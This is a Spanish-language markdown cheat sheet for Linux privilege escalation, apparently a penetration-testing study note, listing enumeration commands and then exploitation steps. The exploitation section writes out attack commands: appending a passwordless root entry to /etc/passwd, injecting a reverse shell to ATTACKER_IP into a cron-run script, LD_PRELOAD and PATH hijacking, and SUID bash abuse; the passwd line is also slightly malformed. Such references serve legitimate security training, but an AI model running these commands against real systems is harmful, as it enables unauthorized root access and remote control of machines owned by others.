# Enumeration: Linux privilege escalation

## 🔍 Sección 1: Enumeración

### 1️⃣ Información del sistema

```bash
uname -a                   # Versión del kernel
cat /etc/os-release        # Información de la distribución
cat /etc/issue							
arch                       # Arquitectura del sistema
sudo -V
```

### 2️⃣ Usuarios y grupos

```bash
whoami                     # Usuario actual
id                          # Grupos del usuario actual
who -a                      # Usuarios conectados
cat /etc/passwd            # Lista de usuarios
cat /etc/shadow            # Hashes de contraseñas (requiere root)
sudo -l                    # Comandos sudo disponibles
```

### 3️⃣ Permisos y archivos sensibles

```bash
find / -perm -4000 2>/dev/null   # Binarios con SUID
find / -perm -2000 2>/dev/null   # Binarios con SGID
find / -type f -writable 2>/dev/null  # Archivos con permisos de escritura
find /home -name '.*history' 2>/dev/null  # Historial de comandos
find / -type f -perm -g=w -group <grupo> 2>/dev/null # Archivos con permiso de escritura por el grupo
find / -type f -writable -user $(whoami) 2>/dev/null # Archivos escribibles por tu usuario actual (sin importar grupo)
find / -writable -group <grupo> 2>/dev/null # directorios (para escribir archivos dentro)
find / -type f -perm -g=w -perm -111 -group <grupo> 2>/dev/null # Buscar archivos ejecutables escribibles por el grupo
find /<directorio> -type d -perm -2 -ls 2>/dev/null
```

### 4️⃣ Procesos y tareas en ejecución

```bash
ps aux | grep root           # Procesos ejecutados por root
ps -ef | grep <proceso>      # Información de un proceso específico
lsof -i                     # Conexiones activas
```

### 5️⃣ Servicios y conexiones

```bash
netstat -tulnp               # Puertos abiertos y servicios activos
ss -tulnp                    # Alternativa a netstat
iptables -L                  # Reglas de firewall
systemctl list-units --type=service  # Servicios activos
```

### 6️⃣ Cron jobs y timers

```bash
ls -lah /etc/cron*           # Revisar cron jobs
cat /etc/crontab            # Tareas programadas
systemctl list-timers       # Timers activos
```

### 7️⃣ Variables de entorno

```bash
env                         # Variables de entorno
echo $PATH                  # Directorios en PATH
cat /etc/profile            # Variables globales
```

### 8️⃣ Capacidades de binarios

```bash
getcap -r / 2>/dev/null     # Binarios con capacidades especiales
```

### 9️⃣ Contenedores y Docker

```bash
docker ps -a                # Contenedores en ejecución
cat /etc/group | grep docker # Ver si el usuario está en el grupo docker
```

## 💥 Sección 2: Explotación

### 1️⃣ Explotación de SUDO mal configurado

```bash
sudo -l                     # Ver permisos sudo
sudo su                     # Si NOPASSWD está habilitado
sudo <comando>              # Ejecutar comandos con sudo
```

### 2️⃣ SUID/SGID abuse

```bash
find / -perm -4000 2>/dev/null   # Buscar archivos con SUID
find / -perm -2000 2>/dev/null   # Buscar archivos con SGID
/bin/bash -p                     # Ejecutar bash con privilegios SUID
```

### 3️⃣ Malos permisos en archivos y directorios

```bash
openssl passwd newpass
codedPass
echo 'root::0:0:codedPass:::/bin/bash' >> /etc/passwd  # Crear usuario root
```

### 4️⃣ Tareas cron y servicios inseguros

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /path/to/vulnerable_script.sh
```

### 5️⃣ Variables de entorno peligrosas

```bash
export PATH=/tmp:$PATH       # Modificar PATH
export LD_PRELOAD=/tmp/malicioso.so  # Cargar biblioteca maliciosa
```

### 6️⃣ Explotación de procesos en ejecución

```bash
gdb -p <PID>                # Adjuntar a un proceso
```

### 7️⃣ Explotación de servicios y configuraciones de red

```bash
showmount -e <IP>           # Revisar NFS
```

### 8️⃣ Extracción de credenciales

```bash
cat ~/.bash_history         # Revisar historial de comandos
```

### 9️⃣ Kernel Exploits

```bash
uname -r                    # Revisar versión del kernel
searchsploit <versión>      # Buscar exploits para el kernel
```
